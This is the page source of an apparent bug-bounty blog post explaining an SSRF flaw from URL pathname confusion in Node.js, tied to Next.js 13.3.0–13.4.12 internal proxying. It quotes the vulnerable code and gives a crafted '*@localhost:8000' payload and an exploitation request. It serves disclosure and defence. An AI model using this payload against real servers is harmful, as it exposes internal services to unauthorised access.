<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SSRF Pathname Confusion | Danil | AppSec & Security research</title><meta name=keywords content="ssrf,bug bounty,nodejs,nextjs"><meta name=description content="SSRF via pathname confusion
Affected pattern
Any Node.js application that constructs internal request URLs using naive string concatenation of the form:
const targetUrl = `http://${host}:${port}${userControlledPathname}`;
and then passes this URL to http.request, http.get, axios, fetch, http-proxy, or similar libraries without strict normalization and validation.
This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like *@.
Root cause
HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:"><meta name=author content><link rel=canonical href=https://evtdanya.github.io/posts/ssrf-pathname-confusion/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://evtdanya.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://evtdanya.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://evtdanya.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://evtdanya.github.io/apple-touch-icon.png><link rel=mask-icon href=https://evtdanya.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://evtdanya.github.io/posts/ssrf-pathname-confusion/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://evtdanya.github.io/posts/ssrf-pathname-confusion/"><meta property="og:site_name" content="Danil | AppSec & Security research"><meta property="og:title" content="SSRF Pathname Confusion"><meta property="og:description" content="SSRF via pathname confusion Affected pattern Any Node.js application that constructs internal request URLs using naive string concatenation of the form:
const targetUrl = `http://${host}:${port}${userControlledPathname}`; and then passes this URL to http.request, http.get, axios, fetch, http-proxy, or similar libraries without strict normalization and validation.
This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like *@.
Root cause HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-02-21T12:04:29+07:00"><meta property="article:modified_time" content="2026-02-21T12:04:29+07:00"><meta property="article:tag" content="Ssrf"><meta property="article:tag" content="Bug Bounty"><meta property="article:tag" content="Nodejs"><meta property="article:tag" content="Nextjs"><meta name=twitter:card content="summary"><meta name=twitter:title content="SSRF Pathname Confusion"><meta name=twitter:description content="SSRF via pathname confusion
Affected pattern
Any Node.js application that constructs internal request URLs using naive string concatenation of the form:
const targetUrl = `http://${host}:${port}${userControlledPathname}`;
and then passes this URL to http.request, http.get, axios, fetch, http-proxy, or similar libraries without strict normalization and validation.
This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like *@.
Root cause
HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://evtdanya.github.io/posts/"},{"@type":"ListItem","position":2,"name":"SSRF Pathname Confusion","item":"https://evtdanya.github.io/posts/ssrf-pathname-confusion/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SSRF Pathname Confusion","name":"SSRF Pathname Confusion","description":"SSRF via pathname confusion Affected pattern Any Node.js application that constructs internal request URLs using naive string concatenation of the form:\nconst targetUrl = `http://${host}:${port}${userControlledPathname}`; and then passes this URL to http.request, http.get, axios, fetch, http-proxy, or similar libraries without strict normalization and validation.\nThis PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like *@.\nRoot cause HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:\n","keywords":["ssrf","bug bounty","nodejs","nextjs"],"articleBody":"SSRF via pathname confusion Affected pattern Any Node.js application that constructs internal request URLs using naive string concatenation of the form:\nconst targetUrl = `http://${host}:${port}${userControlledPathname}`; and then passes this URL to http.request, http.get, axios, fetch, http-proxy, or similar libraries without strict normalization and validation.\nThis PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like *@.\nRoot cause HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:\nPRI * HTTP/1.0 This * in the request line is treated specially by some parsers. When combined with the authority form user@host:port, Node.js http-parser can interpret malformed request lines in unexpected ways (and considers that request line valid).\nSo when pathname is attacker-controlled (via query parameter, route parameter, header, etc), specially crafted values like: http://localhost:3000*@localhost:8000/admin can trick parsers into interpreting the string as:\nURL { href: 'http://localhost:3000*@localhost:8000/admin', origin: 'http://localhost:8000', protocol: 'http:', username: 'localhost', password: '3000*', host: 'localhost:8000', hostname: 'localhost', port: '8000', pathname: '/admin', search: '', searchParams: URLSearchParams {}, hash: '' } This allows the application to send requests to arbitrary internal ports.\nNext.js SSRF In Next.js versions \u003e= 13.3.0 | \u003c= 13.4.12, internal proxying used exactly this vulnerable construction\nSource location packages/next/src/server/lib/start-server.ts:\nconst getProxyServer = (pathname: string) =\u003e { const targetUrl = `http://${ targetHost === 'localhost' ? '127.0.0.1' : targetHost }:${routerPort}${pathname}` const proxyServer = httpProxy.createProxy({ target: targetUrl, changeOrigin: false, ignorePath: true, xfwd: true, ws: true, followRedirects: false, }) proxyServer.on('error', (_err) =\u003e { // TODO?: enable verbose error logs with --debug flag? }) return proxyServer } Since pathname is fully user-controlled, the *@localhost:8000 payloads allowed full SSRF — including reading responses from internal services.\nFrom 13.4.13 onward, internal requests switched to fetch() with proper URL normalization. fetch rejects malformed parts, blocking the attack.\nThis internal proxying feature can be enabled by default (in App Router apps) or by using this config:\n// next.config.js experimental: { appDir: true, } Exploitation Request with payload:\nGET *@127.0.0.1:3002 HTTP/1.1 Host: vulnerable.app ","wordCount":"333","inLanguage":"en","datePublished":"2026-02-21T12:04:29+07:00","dateModified":"2026-02-21T12:04:29+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://evtdanya.github.io/posts/ssrf-pathname-confusion/"},"publisher":{"@type":"Organization","name":"Danil | AppSec \u0026 Security research","logo":{"@type":"ImageObject","url":"https://evtdanya.github.io/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://evtdanya.github.io/ accesskey=h title="Danil | AppSec & Security research (Alt + H)">Danil | AppSec & Security research</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">SSRF Pathname Confusion</h1><div class=post-meta><span title='2026-02-21 12:04:29 +0700 +0700'>February 21, 2026</span>&nbsp;·&nbsp;<span>2 min</span></div></header><div class=post-content><h1 id=ssrf-via-pathname-confusion>SSRF via pathname confusion<a hidden class=anchor aria-hidden=true href=#ssrf-via-pathname-confusion>#</a></h1><h2 id=affected-pattern>Affected pattern<a hidden class=anchor aria-hidden=true href=#affected-pattern>#</a></h2><p>Any Node.js application that constructs internal request URLs using naive string concatenation of the form:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>targetUrl</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`http://</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>host</span><span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}${</span><span style=color:#a6e22e>userControlledPathname</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span></code></pre></div><p>and then passes this URL to <code>http.request</code>, <code>http.get</code>, <code>axios</code>, <code>fetch</code>, <code>http-proxy</code>, or similar libraries without strict normalization and validation.</p><p>This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like <code>*@</code>.</p><h2 id=root-cause>Root cause<a hidden class=anchor aria-hidden=true href=#root-cause>#</a></h2><p>HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:</p><pre tabindex=0><code>PRI * HTTP/1.0
</code></pre><p>This <code>*</code> in the request line is treated specially by some parsers. When combined with the authority form <code>user@host:port</code>, Node.js http-parser can interpret malformed request lines in unexpected ways (and considers that request line <strong>valid</strong>).</p><p>So when pathname is attacker-controlled (via query parameter, route parameter, header, etc), specially crafted values like: <code>http://localhost:3000*@localhost:8000/admin</code> can trick parsers into interpreting the string as:</p><pre tabindex=0><code>URL {
  href: &#39;http://localhost:3000*@localhost:8000/admin&#39;,
  origin: &#39;http://localhost:8000&#39;,
  protocol: &#39;http:&#39;,
  username: &#39;localhost&#39;,
  password: &#39;3000*&#39;,
  host: &#39;localhost:8000&#39;,
  hostname: &#39;localhost&#39;,
  port: &#39;8000&#39;,
  pathname: &#39;/admin&#39;,
  search: &#39;&#39;,
  searchParams: URLSearchParams {},
  hash: &#39;&#39;
}
</code></pre><p>This allows the application to send requests to arbitrary internal ports.</p><h2 id=nextjs-ssrf>Next.js SSRF<a hidden class=anchor aria-hidden=true href=#nextjs-ssrf>#</a></h2><p>In Next.js versions <code>>= 13.3.0 | &lt;= 13.4.12</code>, internal proxying used exactly this vulnerable construction</p><p>Source location <code>packages/next/src/server/lib/start-server.ts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>getProxyServer</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>pathname</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>string</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>targetUrl</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`http://</span><span style=color:#e6db74>${</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>targetHost</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;localhost&#39;</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>targetHost</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>routerPort</span><span style=color:#e6db74>}${</span><span style=color:#a6e22e>pathname</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proxyServer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>httpProxy</span>.<span style=color:#a6e22e>createProxy</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>target</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>targetUrl</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>changeOrigin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ignorePath</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xfwd</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ws</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>followRedirects</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>proxyServer</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;error&#39;</span>, (<span style=color:#a6e22e>_err</span>) =&gt; {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// TODO?: enable verbose error logs with --debug flag?
</span></span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>proxyServer</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Since <code>pathname</code> is fully user-controlled, the <code>*@localhost:8000</code> payloads allowed full SSRF — including reading responses from internal services.</p><p>From 13.4.13 onward, internal requests switched to <code>fetch()</code> with proper URL normalization. <code>fetch</code> rejects malformed parts, blocking the attack.</p><p>This internal proxying feature can be enabled by default (in App Router apps) or by using this config:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// next.config.js
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>experimental</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>appDir</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h3><p>Request with payload:</p><pre tabindex=0><code>GET *@127.0.0.1:3002 HTTP/1.1
Host: vulnerable.app
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://evtdanya.github.io/tags/ssrf/>Ssrf</a></li><li><a href=https://evtdanya.github.io/tags/bug-bounty/>Bug Bounty</a></li><li><a href=https://evtdanya.github.io/tags/nodejs/>Nodejs</a></li><li><a href=https://evtdanya.github.io/tags/nextjs/>Nextjs</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://evtdanya.github.io/>Danil | AppSec & Security research</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>